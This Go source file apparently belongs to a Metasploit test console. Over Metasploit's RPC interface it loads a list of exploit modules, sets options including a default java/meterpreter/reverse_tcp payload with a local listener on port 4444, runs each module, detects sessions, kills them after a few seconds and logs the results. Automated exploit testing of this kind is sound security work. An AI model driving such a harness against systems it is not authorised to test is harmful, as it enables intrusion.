package metasploit

import (
	"log"
	"time"

	"github.com/AlexPodd/metasploit_tester_console/internal/domain"
	"github.com/fpr1m3/go-msf-rpc/rpc"
)

type MetaSploitRPC struct {
	InstanceMSF *rpc.Metasploit
	Report      *domain.Report
}

func (metaSploitRPC *MetaSploitRPC) Login(host, login, password string) (err error) {

	metaSploitRPC.Report = &domain.Report{}
	metaSploitRPC.InstanceMSF, err = rpc.New(host, login, password)

	if err != nil {
		log.Print(err)
	}

	return err

}

func findParamsByName(exploits []domain.ConfigExploit, name string) (map[string]string, bool) {
	for _, e := range exploits {
		if e.Name == name {
			return e.Params, true
		}
	}
	return nil, false
}

func setParams(params map[string]string, meta *MetaSploitRPC, consoleId string) (string, error) {
	var output string
	for key, value := range params {
		setCmd := "set " + key + " " + value + "\n"
		log.Print("set command: ", setCmd)
		_, err := meta.InstanceMSF.ConsoleWrite(consoleId, setCmd)
		if err != nil {
			return "", err
		}
		time.Sleep(300 * time.Millisecond)

		res, err := meta.InstanceMSF.ConsoleRead(consoleId)
		if err != nil {
			return "", err
		}
		output += res.Data
		log.Print("Output during 'set': ", res.Data)
		time.Sleep(500 * time.Millisecond)

	}
	return output, nil
}
func setParamDefoult(meta *MetaSploitRPC, consoleId string) (string, error) {
	defaults := map[string]string{
		// Для локального эксплойта RHOSTS не нужен
		"LHOST":   "127.0.0.1",                    // слушать обратное соединение на локальной машине
		"LPORT":   "4444",                         // порт для обратного соединения
		"PAYLOAD": "java/meterpreter/reverse_tcp", // тип payload
		// "SESSION": "1",                             // если требуется для post-exploit (опционально)
	}

	return setParams(defaults, meta, consoleId)
}
func (metaSploitRPC *MetaSploitRPC) Run(exploits []domain.Exploit, config []domain.ConfigExploit, ch chan int) (*domain.Report, error) {
	console, err := metaSploitRPC.InstanceMSF.ConsoleCreate()
	if err != nil {
		return nil, err
	}
	consoleId := console.Id
	defer metaSploitRPC.InstanceMSF.ConsoleDestroy(consoleId)

	// Перезагрузка всех модулей
	_, err = metaSploitRPC.InstanceMSF.ConsoleWrite(consoleId, "reload_all\n")
	if err != nil {
		return nil, err
	}

	// Ждём окончания загрузки модулей
	for {
		time.Sleep(1000 * time.Millisecond)
		res, err := metaSploitRPC.InstanceMSF.ConsoleRead(consoleId)
		if err != nil {
			return nil, err
		}
		if res.Data != "" {
			log.Print(res.Data)
		}
		if !res.Busy {
			break
		}
	}

	for i, exploit := range exploits {
		var output string

		// Выбираем эксплоит
		_, err := metaSploitRPC.InstanceMSF.ConsoleWrite(consoleId, "use "+exploit.Path+"\n")
		if err != nil {
			return nil, err
		}

		time.Sleep(200 * time.Millisecond)
		res, err := metaSploitRPC.InstanceMSF.ConsoleRead(consoleId)
		if err != nil {
			return nil, err
		}
		output += res.Data
		log.Print("Output after 'use': ", res.Data)

		// Настройка параметров
		param, ok := findParamsByName(config, exploit.Name)
		if ok {
			result, err := setParams(param, metaSploitRPC, consoleId)
			if err != nil {
				output += "Error during set param: " + err.Error()
			}
			output += result
		} else {
			result, err := setParamDefoult(metaSploitRPC, consoleId)
			if err != nil {
				output += "Error during set param: " + err.Error()
			}
			output += result
		}

		// Запуск эксплоита
		_, err = metaSploitRPC.InstanceMSF.ConsoleWrite(consoleId, "run\n")
		if err != nil {
			return nil, err
		}

		start := time.Now()
		var newSessionID uint32
		var success bool
		success = false
		for {
			time.Sleep(300 * time.Millisecond)

			// Читаем консоль
			res, err := metaSploitRPC.InstanceMSF.ConsoleRead(consoleId)
			if err != nil {
				return nil, err
			}
			if res.Data != "" {
				output += res.Data
				log.Print("Output during 'run': ", res.Data)

				// Проверяем сессии
				sessions, err := metaSploitRPC.InstanceMSF.SessionList()
				if err != nil {
					return nil, err
				}

				for id := range sessions {

					if newSessionID == 0 {
						newSessionID = id
						success = true

						log.Printf("New session %d detected", newSessionID)
						// Запускаем горутину, которая завершит сессию через 3 секунды
						go func(sid uint32) {
							time.Sleep(3 * time.Second)
							result, err := metaSploitRPC.InstanceMSF.SessionMeterpreterSessionKill(sid)
							if err != nil {
								log.Printf("Failed to kill session %d: %v", sid, err)
								return
							}
							log.Printf("Session %d killed: %s", sid, result.Result)
						}(newSessionID)
					}
				}
			}
			// Завершаем чтение, если консоль больше не занята или прошло 10 секунд
			if !res.Busy || time.Since(start) > 10*time.Second {
				break
			}
		}

		// Сохраняем результат
		exploitRes := domain.ExploitResult{
			ExploitName: exploit.Name,
			Output:      output,
			Success:     success,
		}
		metaSploitRPC.Report.Results = append(metaSploitRPC.Report.Results, exploitRes)

		// Отправка прогресса
		if ch != nil {
			ch <- i + 1
		}
	}

	metaSploitRPC.Report.Timestamp = time.Now()

	return metaSploitRPC.Report, nil
}
